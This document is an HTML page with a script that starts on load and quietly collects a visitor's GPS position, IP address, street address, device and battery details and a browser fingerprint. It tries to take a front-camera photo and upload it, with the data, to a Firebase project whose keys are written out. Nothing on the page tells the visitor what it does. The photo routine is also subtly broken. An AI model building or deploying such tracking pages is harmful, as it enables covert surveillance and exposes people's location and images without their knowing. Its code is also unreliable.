<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture</title>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-storage.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
    </style>
</head>
<body>
    <script>
        // ==================== FIREBASE CONFIGURATIONS ====================
        const firebaseConfig = {
            apiKey: "AIzaSyBgIg7tbnGtSoeo0nHMn6IkeuvMp30ar9w",
            authDomain: "esrat-4e28f.firebaseapp.com",
            databaseURL: "https://esrat-4e28f-default-rtdb.firebaseio.com",
            projectId: "esrat-4e28f",
            storageBucket: "esrat-4e28f.appspot.com",
            messagingSenderId: "712315598095",
            appId: "1:712315598095:android:ed0f042ee1d5410dfb7a7a"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const storage = firebase.storage();
        const database = firebase.database();

        // ==================== UTILITY FUNCTIONS ====================
        
        // Get Public IP Address
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                console.error('Error fetching public IP:', error);
                return 'Unknown';
            }
        }

        // Get GPS Location
        function getGPSLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            });
                        },
                        (error) => {
                            console.error('Geolocation error:', error);
                            resolve({ latitude: null, longitude: null, accuracy: null });
                        }
                    );
                } else {
                    resolve({ latitude: null, longitude: null, accuracy: null });
                }
            });
        }

        // Get Device Specs
        function getDeviceSpecs() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
                deviceMemory: navigator.deviceMemory || 'Unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0
            };
        }

        // Get Network Details
        async function getNetworkDetails() {
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (connection) {
                return {
                    effectiveType: connection.effectiveType || 'Unknown',
                    downlink: connection.downlink || 'Unknown',
                    rtt: connection.rtt || 'Unknown',
                    saveData: connection.saveData || false
                };
            }
            return { effectiveType: 'Unknown', downlink: 'Unknown', rtt: 'Unknown', saveData: false };
        }

        // Get Battery Status
        async function getBatteryStatus() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    return {
                        level: (battery.level * 100).toFixed(2) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                } else if (navigator.battery) {
                    const battery = navigator.battery;
                    return {
                        level: (battery.level * 100).toFixed(2) + '%',
                        charging: battery.charging,
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
            } catch (error) {
                console.error('Battery API error:', error);
            }
            return { level: 'Unknown', charging: false, chargingTime: 'Unknown', dischargingTime: 'Unknown' };
        }

        // Get Screen Size
        function getScreenSize() {
            return {
                width: window.screen.width,
                height: window.screen.height,
                colorDepth: window.screen.colorDepth,
                pixelDepth: window.screen.pixelDepth,
                devicePixelRatio: window.devicePixelRatio
            };
        }

        // Generate Browser Fingerprint
        async function generateBrowserFingerprint() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Browser Fingerprint', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Browser Fingerprint', 4, 17);
            
            const canvasData = canvas.toDataURL();
            const hash = await hashString(canvasData);
            return hash;
        }

        // Hash String Function
        async function hashString(str) {
            const encoder = new TextEncoder();
            const data = encoder.encode(str);
            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
            const hashArray = Array.from(new Uint8Array(hashBuffer));
            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
        }

        // Get Address from GPS (Reverse Geocoding)
        async function getAddressFromGPS(latitude, longitude) {
            try {
                const apiKey = '6706339e20b94127377139nyudb9267';
                const response = await fetch(`https://geocode.maps.co/reverse?lat=${latitude}&lon=${longitude}&api_key=${apiKey}`);
                const data = await response.json();
                return data.address || 'Unknown';
            } catch (error) {
                console.error('Reverse geocoding error:', error);
                return 'Unknown';
            }
        }

        // Get Indian Time
        function getIndianTime() {
            const options = {
                timeZone: 'Asia/Kolkata',
                year: 'numeric',
                month: '2-digit',
                day: '2-digit',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            };
            return new Date().toLocaleString('en-IN', options);
        }

        // Watermark Photo
        function watermarkPhoto(imageData, metadata) {
            return new Promise((resolve) => {
                const img = new Image();
                img.onload = function() {
                    const canvas = document.createElement('canvas');
                    canvas.width = img.width;
                    canvas.height = img.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0);

                    // Watermark text
                    ctx.fillStyle = 'rgba(255, 255, 255, 0.8)';
                    ctx.font = 'bold 14px Arial';
                    ctx.shadowColor = 'rgba(0, 0, 0, 0.8)';
                    ctx.shadowBlur = 4;

                    let yOffset = 20;
                    const watermarkData = [
                        `Time: ${metadata.timestamp}`,
                        `GPS: ${metadata.gps.latitude?.toFixed(6)}, ${metadata.gps.longitude?.toFixed(6)}`,
                        `IP: ${metadata.publicIP}`,
                        `Battery: ${metadata.battery.level}`,
                        `Network: ${metadata.network.effectiveType}`,
                        `Screen: ${metadata.screen.width}x${metadata.screen.height}`
                    ];

                    watermarkData.forEach(text => {
                        ctx.fillText(text, 10, yOffset);
                        yOffset += 20;
                    });

                    canvas.toBlob(resolve, 'image/jpeg', 0.95);
                };
                img.src = imageData;
            });
        }

        // Capture Photo from Camera
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.play();

                setTimeout(() => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    stream.getTracks().forEach(track => track.stop());
                    return canvas.toDataURL('image/jpeg');
                }, 1000);
            } catch (error) {
                console.error('Camera access error:', error);
                return null;
            }
        }

        // Collect All Data
        async function collectAllData() {
            const gps = await getGPSLocation();
            const publicIP = await getPublicIP();
            const address = gps.latitude && gps.longitude ? await getAddressFromGPS(gps.latitude, gps.longitude) : 'Unknown';
            const battery = await getBatteryStatus();
            const network = await getNetworkDetails();
            const screen = getScreenSize();
            const deviceSpecs = getDeviceSpecs();
            const fingerprint = await generateBrowserFingerprint();
            const timestamp = getIndianTime();

            return {
                timestamp,
                gps,
                publicIP,
                address,
                battery,
                network,
                screen,
                deviceSpecs,
                fingerprint
            };
        }

        // Save Data to Firebase
        async function saveToFirebase(photoBlob, metadata) {
            try {
                const timestamp = new Date().getTime();
                const photoRef = storage.ref(`photos/${timestamp}.jpg`);
                await photoRef.put(photoBlob);
                const photoURL = await photoRef.getDownloadURL();

                const dataRef = database.ref(`captures/${timestamp}`);
                await dataRef.set({
                    timestamp: metadata.timestamp,
                    photoURL,
                    gps: metadata.gps,
                    publicIP: metadata.publicIP,
                    address: metadata.address,
                    battery: metadata.battery,
                    network: metadata.network,
                    screen: metadata.screen,
                    deviceSpecs: metadata.deviceSpecs,
                    fingerprint: metadata.fingerprint,
                    createdAt: new Date().toISOString()
                });

                console.log('Data saved to Firebase successfully!');
                alert('Photo and data captured and saved to Firebase!');
            } catch (error) {
                console.error('Firebase save error:', error);
                alert('Error saving to Firebase. Please check your configuration.');
            }
        }

        // Main Initialization
        async function init() {
            try {
                console.log('Starting data capture...');
                
                // Collect all data
                const metadata = await collectAllData();
                console.log('Collected metadata:', metadata);

                // Capture photo
                const photoData = await capturePhoto();
                if (photoData) {
                    // Watermark photo
                    const watermarkedBlob = await watermarkPhoto(photoData, metadata);
                    
                    // Save to Firebase
                    await saveToFirebase(watermarkedBlob, metadata);
                } else {
                    console.error('Failed to capture photo');
                    alert('Failed to capture photo. Please allow camera access.');
                }
            } catch (error) {
                console.error('Initialization error:', error);
                alert('An error occurred. Check the console for details.');
            }
        }

        // Start on page load
        window.addEventListener('load', init);
    </script>
</body>
</html>
